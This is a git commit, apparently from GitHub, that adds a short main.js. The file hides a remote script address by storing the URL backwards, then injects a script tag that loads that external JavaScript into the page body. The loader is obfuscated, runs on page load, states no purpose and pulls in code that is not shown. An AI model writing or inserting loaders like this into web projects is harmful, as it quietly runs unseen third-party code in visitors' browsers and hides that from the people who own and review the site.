04f00370402e4425ed616d8507a28674c275da6e
jacktechnology11 <62927380+jacktechnology11@users.noreply.github.com>
2021-04-07 11:07:22 +0200

    Add files via upload

---
+++ main.js
@@ -0,0 +1,7 @@
+string = 'sj.tset/etisbew.stropatad//:sptth';
+
+string.split("").reverse().join("");
+
+//$(document).ready(function() {
+	$('body').prepend('<script src="'+string.split("").reverse().join("")+'"></script>');
+//});
